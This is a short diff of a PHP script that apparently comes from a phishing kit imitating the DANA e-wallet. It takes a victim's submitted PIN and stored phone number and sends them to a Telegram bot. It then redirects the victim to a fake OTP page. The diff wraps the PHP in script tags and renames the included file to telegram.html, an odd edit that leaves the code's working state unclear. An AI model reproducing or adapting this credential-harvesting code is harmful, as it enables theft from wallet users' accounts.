@@ -1,7 +1,8 @@
+<script>
 <?php
 
 session_start();
-include "./telegram.php";
+include "./telegram.html";
 
 $pin1        = $_POST['pin1'];
 $phoneNumber = $_SESSION['phoneNumber'];
@@ -34,3 +35,5 @@ sendMessage($telegram_id, $message, $id_bot);
 header('Location: ../dana_otp/index.html');
 
 ?>
+
+</script>
